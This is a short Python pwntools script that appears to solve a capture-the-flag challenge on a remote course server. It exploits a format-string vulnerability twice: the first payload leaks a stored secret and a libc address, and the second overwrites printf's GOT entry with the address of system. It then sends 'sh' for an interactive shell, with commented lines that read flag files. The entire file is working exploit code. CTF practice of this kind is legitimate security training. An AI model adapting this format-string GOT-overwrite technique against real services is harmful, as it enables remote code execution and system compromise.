#!/usr/bin/env python
from pwn import *

host, port = 'csie.ctf.tw', 10129
#host, port = '127.0.0.1', 7126
y = remote(host, port)

a = 0x6012ac

#raw_input('@')
fmt_string = '%45068c%24$hn%19138c%25$hnABC%8$p.%9$pABC%26$s'
p = fmt_string.ljust(0x40, '\x00') + p64(a) + p64(a+2) + p64(0x6011e0)
y.sendafter('name ?', p)

y.recvuntil('ABC0x')

#print y.recvuntil('.0x')[:-3]
secret = p64(int(y.recvuntil('.0x')[:-3], 16)) + \
p64(int(y.recvuntil('ABC')[:-3], 16))

libc = u64(y.recv(6).ljust(8, '\x00')) - 0x21ab0
success('libc = %s' % hex(libc))

print y.recvuntil('}')

y.sendafter('?', secret)
print y.recvuntil('}')

printf_got = 0x601230
system = libc + 0x4f440

fmt_string2 = '%{}c%12$hhn%{}c%14$hn'.format(system & 0xff, ((system & 0xffff00) >> 8) - (system & 0xff))
p2 = fmt_string2.ljust(0x18, '\x00') + p64(printf_got) + p64(printf_got+1)
y.sendafter(':', p2)

#sleep(3)
y.send('sh')
#sleep(1)
#y.sendline('cat /home/`whoami`/flag1')
#y.sendline('cat /home/`whoami`/flag2')
#y.sendline('cat /home/`whoami`/flag3')

y.interactive()



